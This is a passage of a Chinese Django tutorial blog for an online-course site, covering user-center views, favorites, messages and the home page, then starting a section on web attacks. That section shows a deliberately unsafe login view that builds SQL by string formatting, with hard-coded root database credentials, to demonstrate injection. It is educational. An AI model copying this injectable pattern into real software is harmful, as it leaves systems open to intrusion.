UpdateEmailView(LoginRequiredMixin, View):</span><br><span class="line">    login_url &#x3D; &#39;&#x2F;login&#x2F;&#39;</span><br><span class="line">    redirect_field_name &#x3D; &#39;next&#39;</span><br><span class="line">    def post(self, request):</span><br><span class="line">        email &#x3D; request.POST.get(&quot;email&quot;, &quot;&quot;)</span><br><span class="line">        code &#x3D; request.POST.get(&quot;code&quot;, &quot;&quot;)</span><br><span class="line"></span><br><span class="line">        existed_records &#x3D; EmailVerifyRecord.objects.filter(email&#x3D;email, code&#x3D;code, send_type&#x3D;&#39;update_email&#39;)</span><br><span class="line">        if existed_records:</span><br><span class="line">            user &#x3D; request.user</span><br><span class="line">            user.email &#x3D; email</span><br><span class="line">            user.save()</span><br><span class="line">            return HttpResponse(&#39;&#123;&quot;status&quot;:&quot;success&quot;&#125;&#39;, content_type&#x3D;&#39;application&#x2F;json&#39;)</span><br><span class="line">        else:</span><br><span class="line">            return HttpResponse(&#39;&#123;&quot;email&quot;:&quot;验证码无效&quot;&#125;&#39;, content_type&#x3D;&#39;application&#x2F;json&#39;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>修改邮箱的url</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url(r&#39;^update_email&#x2F;$&#39;, UpdateEmailView.as_view(), name&#x3D;&quot;update_email&quot;),</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>为userInfo view增加post方法。使用modelform完成直接提交</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">def post(self,request):</span><br><span class="line">    # 不像用户咨询是一个新的。需要指明instance。不然无法修改，而是新增用户</span><br><span class="line">    user_info_form &#x3D; UserInfoForm(request.POST, instance&#x3D;request.user)</span><br><span class="line">    if user_info_form.is_valid():</span><br><span class="line">        user_info_form.save()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>user_info_form</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 用于个人中心修改个人信息</span><br><span class="line">class UserInfoForm(forms.ModelForm):</span><br><span class="line"></span><br><span class="line">    class Meta:</span><br><span class="line">        model &#x3D; UserProfile</span><br><span class="line">        fields &#x3D; [&#39;nick_name&#39;,&#39;gender&#39;,&#39;birthday&#39;,&#39;address&#39;,&#39;mobile&#39;]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/1779926-80221e9b67ebdf40.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/581" alt="img"></p><p>配置url和view</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 用户中心我的课程</span><br><span class="line">path(&#39;mycourse&#x2F;&#39;, MyCourseView.as_view(), name&#x3D;&quot;mycourse&quot;),</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>usercenter base中添加链接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 个人中心页我的课程</span><br><span class="line"></span><br><span class="line">class MyCourseView(LoginRequiredMixin, View):</span><br><span class="line">    login_url &#x3D; &#39;&#x2F;login&#x2F;&#39;</span><br><span class="line">    redirect_field_name &#x3D; &#39;next&#39;</span><br><span class="line"></span><br><span class="line">    def get(self, request):</span><br><span class="line">        user_courses &#x3D; UserCourse.objects.filter(user&#x3D;request.user)</span><br><span class="line">        return render(request, &quot;usercenter-mycourse.html&quot;, &#123;</span><br><span class="line">            &quot;user_courses&quot;:user_courses,</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/1779926-4974e972f6b69fcd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/608" alt="img"></p><h3 id="配置url和view-1"><a href="#配置url和view-1" class="headerlink" title="配置url和view"></a>配置url和view</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 我收藏的课程机构</span><br><span class="line">path(&#39;myfav&#x2F;org&#x2F;&#39;, MyFavOrgView.as_view(), name&#x3D;&quot;myfav_org&quot;),</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">class MyFavOrgView(LoginRequiredMixin, View):</span><br><span class="line">    login_url &#x3D; &#39;&#x2F;login&#x2F;&#39;</span><br><span class="line">    redirect_field_name &#x3D; &#39;next&#39;</span><br><span class="line"></span><br><span class="line">    def get(self, request):</span><br><span class="line">        org_list &#x3D; []</span><br><span class="line">        fav_orgs&#x3D; UserFavorite.objects.filter(user&#x3D;request.user, fav_type&#x3D;2)</span><br><span class="line">        # 上面的fav_orgs只是存放了id。我们还需要通过id找到机构对象</span><br><span class="line">        for fav_org in fav_orgs:</span><br><span class="line">            # 取出fav_id也就是机构的id。</span><br><span class="line">            org_id &#x3D; fav_org.fav_id</span><br><span class="line">            # 获取这个机构对象</span><br><span class="line">            org &#x3D; CourseOrg.objects.get(id&#x3D;org_id)</span><br><span class="line">            org_list.append(org)</span><br><span class="line">        return render(request, &quot;usercenter-fav-org.html&quot;, &#123;</span><br><span class="line">            &quot;org_list&quot;: org_list,</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"># 我收藏的授课讲师</span><br><span class="line"></span><br><span class="line">class MyFavTeacherView(LoginRequiredMixin, View):</span><br><span class="line">    login_url &#x3D; &#39;&#x2F;login&#x2F;&#39;</span><br><span class="line">    redirect_field_name &#x3D; &#39;next&#39;</span><br><span class="line"></span><br><span class="line">    def get(self, request):</span><br><span class="line">        teacher_list &#x3D; []</span><br><span class="line">        fav_teachers&#x3D; UserFavorite.objects.filter(user&#x3D;request.user, fav_type&#x3D;3)</span><br><span class="line">        # 上面的fav_orgs只是存放了id。我们还需要通过id找到机构对象</span><br><span class="line">        for fav_teacher in fav_teachers:</span><br><span class="line">            # 取出fav_id也就是机构的id。</span><br><span class="line">            teacher_id &#x3D; fav_teacher.fav_id</span><br><span class="line">            # 获取这个机构对象</span><br><span class="line">            teacher &#x3D; Teacher.objects.get(id&#x3D;teacher_id)</span><br><span class="line">            teacher_list.append(teacher)</span><br><span class="line">        return render(request, &quot;usercenter-fav-teacher.html&quot;, &#123;</span><br><span class="line">            &quot;teacher_list&quot;: teacher_list,</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>url</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 我收藏的课程机构</span><br><span class="line">path(&#39;myfav&#x2F;org&#x2F;&#39;, MyFavOrgView.as_view(), name&#x3D;&quot;myfav_org&quot;),</span><br><span class="line"></span><br><span class="line"># 我收藏的授课讲师</span><br><span class="line">path(&#39;myfav&#x2F;teacher&#x2F;&#39;, MyFavTeacherView.as_view(), name&#x3D;&quot;myfav_teacher&quot;),</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="配置view和url"><a href="#配置view和url" class="headerlink" title="配置view和url"></a>配置view和url</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"># 我收藏的课程</span><br><span class="line"></span><br><span class="line">class MyFavCourseView(LoginRequiredMixin, View):</span><br><span class="line">    login_url &#x3D; &#39;&#x2F;login&#x2F;&#39;</span><br><span class="line">    redirect_field_name &#x3D; &#39;next&#39;</span><br><span class="line"></span><br><span class="line">    def get(self, request):</span><br><span class="line">        course_list &#x3D; []</span><br><span class="line">        fav_courses &#x3D; UserFavorite.objects.filter(user&#x3D;request.user, fav_type&#x3D;1)</span><br><span class="line">        # 上面的fav_orgs只是存放了id。我们还需要通过id找到机构对象</span><br><span class="line">        for fav_course in fav_courses:</span><br><span class="line">            # 取出fav_id也就是机构的id。</span><br><span class="line">            course_id &#x3D; fav_course.fav_id</span><br><span class="line">            # 获取这个机构对象</span><br><span class="line">            course &#x3D; Course.objects.get(id&#x3D;course_id)</span><br><span class="line">            course_list.append(course)</span><br><span class="line">        return render(request, &quot;usercenter-fav-course.html&quot;, &#123;</span><br><span class="line">            &quot;course_list&quot;: course_list,</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 我收藏的课程</span><br><span class="line">path(&#39;myfav&#x2F;course&#x2F;&#39;, MyFavCourseView.as_view(), name&#x3D;&quot;myfav_course&quot;),</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="取消收藏"><a href="#取消收藏" class="headerlink" title="取消收藏"></a>取消收藏</h2><p>templates/usercenter-fav-course.html</p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-46e2bc9cc88378d9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/634" alt="img"></p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-c02313ef5c1c1ad0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/432" alt="img"></p><p>取消收藏的代码在base页面中。三个js。</p><h2 id="我的消息页面"><a href="#我的消息页面" class="headerlink" title="我的消息页面"></a>我的消息页面</h2><p><img src="https://upload-images.jianshu.io/upload_images/1779926-781dd84189d4a0b2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/700" alt="img"></p><h3 id="配置url和view-2"><a href="#配置url和view-2" class="headerlink" title="配置url和view"></a>配置url和view</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 我收藏的课程</span><br><span class="line">path(&#39;my_message&#x2F;&#39;, MyMessageView.as_view(), name&#x3D;&quot;my_message&quot;),</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"># 我的消息</span><br><span class="line">class MyMessageView(LoginRequiredMixin, View):</span><br><span class="line">    login_url &#x3D; &#39;&#x2F;login&#x2F;&#39;</span><br><span class="line">    redirect_field_name &#x3D; &#39;next&#39;</span><br><span class="line"></span><br><span class="line">    def get(self, request):</span><br><span class="line">        all_message &#x3D; UserMessage.objects.filter(user&#x3D; request.user.id)</span><br><span class="line">        # 对课程机构进行分页</span><br><span class="line">        # 尝试获取前台get请求传递过来的page参数</span><br><span class="line">        # 如果是不合法的配置参数默认返回第一页</span><br><span class="line">        try:</span><br><span class="line">            page &#x3D; request.GET.get(&#39;page&#39;, 1)</span><br><span class="line">        except PageNotAnInteger:</span><br><span class="line">            page &#x3D; 1</span><br><span class="line">        # 这里指从allorg中取五个出来，每页显示5个</span><br><span class="line">        p &#x3D; Paginator(all_message, 4)</span><br><span class="line">        messages &#x3D; p.page(page)</span><br><span class="line">        return  render(request, &quot;usercenter-message.html&quot;, &#123;</span><br><span class="line">        &quot;messages&quot;:messages,</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="注册时发生欢迎消息"><a href="#注册时发生欢迎消息" class="headerlink" title="注册时发生欢迎消息"></a>注册时发生欢迎消息</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 写入欢迎注册消息</span><br><span class="line">           user_message &#x3D; UserMessage()</span><br><span class="line">           user_message.user &#x3D; user_profile.id</span><br><span class="line">           user_message.message &#x3D; &quot;欢迎注册mtianyan慕课小站!!&quot;</span><br><span class="line">           user_message.save()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="页面顶部小喇叭"><a href="#页面顶部小喇叭" class="headerlink" title="页面顶部小喇叭"></a>页面顶部小喇叭</h3><p>所有页面都要读取一个共同的变量：未读消息的数量。我们需要向request中注入这个变量<br>所有页面都有request.user对象。所以我们在userprofile中自定义方法，</p><pre><code># 获取用户未读消息的数量def unread_nums(self):    from operation.models import UserMessage    return  UserMessage.objects.filter(user=self.id).count()</code></pre><p>#<center> 首页,全局功能细节和404以及500页面配置</center></p><h2 id="登出和点击数以及收藏数完善"><a href="#登出和点击数以及收藏数完善" class="headerlink" title="登出和点击数以及收藏数完善"></a>登出和点击数以及收藏数完善</h2><h3 id="退出登录"><a href="#退出登录" class="headerlink" title="退出登录"></a>退出登录</h3><p>Python3+django2.0.1下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">class LogoutView(View):</span><br><span class="line">    def get(self, request):</span><br><span class="line">        # django自带的logout</span><br><span class="line">        logout(request)</span><br><span class="line">        # 重定向到首页,</span><br><span class="line">        return HttpResponseRedirect(reverse(&quot;index&quot;))</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 退出功能url</span><br><span class="line">path(&#39;logout&#x2F;&#39;, LogoutView.as_view(), name&#x3D;&quot;logout&quot;),</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="点击数加1"><a href="#点击数加1" class="headerlink" title="点击数加1"></a>点击数加1</h3><p>CourseInfoView学习人数加1</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">course.students +&#x3D; 1</span><br><span class="line">course.save()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/1779926-069b6b1aeedc7c3d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/435" alt="img"></p><p>TeacherDetailView：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">teacher.click_nums +&#x3D;1</span><br><span class="line">teacher.save()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>OrgHomeView</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">course_org.click_nums +&#x3D;1</span><br><span class="line">        course_org.save()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>收藏数统计</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">exist_records.delete()</span><br><span class="line">if int(type) &#x3D;&#x3D; 1:</span><br><span class="line">    course &#x3D; Course.objects.get(id&#x3D;int(id))</span><br><span class="line">    course.fav_nums -&#x3D;1</span><br><span class="line">    if course.fav_nums &lt; 0:</span><br><span class="line">        course.fav_nums &#x3D; 0</span><br><span class="line">    course.save()</span><br><span class="line">elif int(type) &#x3D;&#x3D; 2:</span><br><span class="line">    org &#x3D; CourseOrg.objects.get(id&#x3D;int(id))</span><br><span class="line">    org.fav_nums -&#x3D; 1</span><br><span class="line">    if org.fav_nums &lt; 0:</span><br><span class="line">        org.fav_nums &#x3D; 0</span><br><span class="line">    org.save()</span><br><span class="line">elif int(type) &#x3D;&#x3D; 3:</span><br><span class="line">    teacher &#x3D; Teacher.objects.get(id&#x3D;int(id))</span><br><span class="line">    teacher.fav_nums -&#x3D;1</span><br><span class="line">    if teacher.fav_nums &lt; 0:</span><br><span class="line">        teacher.fav_nums &#x3D; 0</span><br><span class="line">    teacher.save()</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">user_fav.save()</span><br><span class="line"></span><br><span class="line">               if int(type) &#x3D;&#x3D; 1:</span><br><span class="line">                   course &#x3D; Course.objects.get(id&#x3D;int(id))</span><br><span class="line">                   course.fav_nums +&#x3D; 1</span><br><span class="line">                   course.save()</span><br><span class="line">               elif int(type) &#x3D;&#x3D; 2:</span><br><span class="line">                   org &#x3D; CourseOrg.objects.get(id&#x3D;int(id))</span><br><span class="line">                   org.fav_nums +&#x3D; 1</span><br><span class="line">                   org.save()</span><br><span class="line">               elif int(type) &#x3D;&#x3D; 3:</span><br><span class="line">                   teacher &#x3D; Teacher.objects.get(id&#x3D;int(id))</span><br><span class="line">                   teacher.fav_nums +&#x3D; 1</span><br><span class="line">                   teacher.save()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>注意负数的处理：</p><p>修改消息已读</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 用户进入个人中心消息页面，清空未读消息记录</span><br><span class="line">all_unread_messages &#x3D; UserMessage.objects.filter(user&#x3D;request.user.id, has_read&#x3D;False)</span><br><span class="line">for unread_message in all_unread_messages:</span><br><span class="line">    unread_message.has_read &#x3D; True</span><br><span class="line">    unread_message.save()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>改进取出未读数字</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">return  UserMessage.objects.filter(has_read&#x3D;False, user&#x3D;self.id).count()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="首页功能开发"><a href="#首页功能开发" class="headerlink" title="首页功能开发"></a>首页功能开发</h2><p>轮播图</p><p>公开课</p><p>授课机构</p><p>新建view</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">## 首页view</span><br><span class="line">class IndexView(View):</span><br><span class="line">    def get(self,request):</span><br><span class="line">        # 取出轮播图</span><br><span class="line">        all_banner &#x3D; Banner.objects.all().order_by(&#39;index&#39;)[:5]</span><br><span class="line">        # 正常位课程</span><br><span class="line">        courses &#x3D; Course.objects.filter(is_banner&#x3D;False)[:6]</span><br><span class="line">        # 轮播图课程取三个</span><br><span class="line">        banner_courses &#x3D; Course.objects.filter(is_banner&#x3D;True)[:3]</span><br><span class="line">        # 课程机构</span><br><span class="line">        course_orgs &#x3D; CourseOrg.objects.all()[:15]</span><br><span class="line">        return render(request, &#39;index.html&#39;, &#123;</span><br><span class="line">            &quot;all_banner&quot;:all_banner,</span><br><span class="line">            &quot;courses&quot;:courses,</span><br><span class="line">            &quot;banner_courses&quot;:banner_courses,</span><br><span class="line">            &quot;course_orgs&quot;:course_orgs,</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>为课程添加字段: <code>isbanner</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">is_banner &#x3D; models.BooleanField(default&#x3D;False, verbose_name&#x3D;u&quot;是否轮播&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>url配置:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">path(&#39;&#39;, IndexView.as_view(), name&#x3D;  &quot;index&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/1779926-2bae04c6dee76654.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/494" alt="img"></p><p>使用django自带模板标签<code>add</code>添加2</p><p>为<code>courseOrg</code>添加字段<code>tag</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tag &#x3D; models.CharField(max_length&#x3D;10, default&#x3D; u&quot;国内名校&quot;,verbose_name&#x3D;u&quot;机构标签&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/1779926-e5a6eb5e18505a71.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/483" alt="img"></p><p>template内建标签被五整除</p><h2 id="配置全局404和500"><a href="#配置全局404和500" class="headerlink" title="配置全局404和500"></a>配置全局404和500</h2><p>Mxonline3/urls.py</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 全局404页面配置</span><br><span class="line">handler404 &#x3D; &#39;users.views.page_not_found&#39;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>users/views.py</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 404对应处理view</span><br><span class="line"></span><br><span class="line">def page_not_found(request):</span><br><span class="line">    from django.shortcuts import  render_to_response</span><br><span class="line">    response &#x3D; render_to_response(&quot;404.html&quot;, &#123;</span><br><span class="line"></span><br><span class="line">    &#125;)</span><br><span class="line">    # 设置response的状态码</span><br><span class="line">    response.status_code &#x3D; 404</span><br><span class="line">    return response</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Debug = True 404是不起作用的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ALLOWED_HOSTS &#x3D; [&#39;*&#39;]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在debug为false情况下。</p><p>我们在访问media的时候配置过用serve来取<br>告诉它访问media的时候去哪个路径下找</p><p>debug为True</p><p>会自动前往STATICFILES——DIRS取文件的</p><p>一旦debug改为false，django就不会代管你的静态文件，</p><p>一般静态文件通过第三方http服务器代理转发。</p><p>nignx 和 Apache都会自动代理这些静态文件</p><p>方法1：我们自己url响应我们的static</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">STATIC_ROOT &#x3D; os.path.join(BASE_DIR, &#39;static&#39;)</span><br></pre></td></tr></table></figure><h1 id="常见web攻击及防范"><a href="#常见web攻击及防范" class="headerlink" title="常见web攻击及防范"></a><center>常见web攻击及防范</center></h1><p>sql注入的危害</p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-5d766e11de0738fb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/291" alt="img"></p><p>对于用户的输入进行合法性判断。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">class LoginUnsafeView(View):</span><br><span class="line">    def get(self, request):</span><br><span class="line">        return render(request, &quot;login.html&quot;, &#123;&#125;)</span><br><span class="line">    def post(self, request):</span><br><span class="line">        user_name &#x3D; request.POST.get(&quot;username&quot;, &quot;&quot;)</span><br><span class="line">        pass_word &#x3D; request.POST.get(&quot;password&quot;, &quot;&quot;)</span><br><span class="line"></span><br><span class="line">        import MySQLdb</span><br><span class="line">        conn &#x3D; MySQLdb.connect(host&#x3D;&#39;127.0.0.1&#39;, user&#x3D;&#39;root&#39;, passwd&#x3D;&#39;root&#39;, db&#x3D;&#39;mxonline&#39;, charset&#x3D;&#39;utf8&#39;)</span><br><span class="line">        cursor &#x3D; conn.cursor()</span><br><span class="line">        sql_select &#x3D; &quot;select * from users_userprofile where email&#x3D;&#39;&#123;0&#125;&#39; and password&#x3D;&#39;&#123;1&#125;&#39;&quot;.format(user_name, pass_word)</span><br><span class="line"></span><br><span class="line">        result &#x3D; cursor.execute(sql_select)</span><br><span class="line">        for row in cursor.fetchall():</span><br><span class="line">            # 查询到用户</span><br><span class="line">            pass</span><br><span class="line">        print &#39;hello&#39;</span><br><span class="line"></span><br><span class="line">urls.py</span><br><span class="line">from users.views import LoginUnsafeView</span><br><span class="line"></span><br><span class="line">urlpatterns &#x3D; [</span><br><span class="line">    url(&#39;^login&#x2F;&#39;, LoginUnsafeView.as_view(), name&#x3D;&#39;login&#39;),</span><br><span class="line">]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>参数中加入sql语句拼接字符串使之为真。</p><p>使用django的orm，它已经对这些做了处理</p><h2 id="xss攻击"><a href="#xss攻击" class="headerlink" title="xss攻击"></a>xss攻击</h2><p>xss跨站脚本攻击(Cross Site Scripting)的危害</p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-2d013c71d3d2240a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/396" alt="img"></p><p>正常流程</p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-3654a343edd8dd7e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/413" alt="img"></p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-36ab833452623bb5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/299" alt="img"></p><p>当传入iPhone6时，这个字符会被显示到页面中。</p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-015f06294fcbaa4f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/485" alt="img"></p><p>将这段代码改成js代码</p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-199eed9caa61b751.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/511" 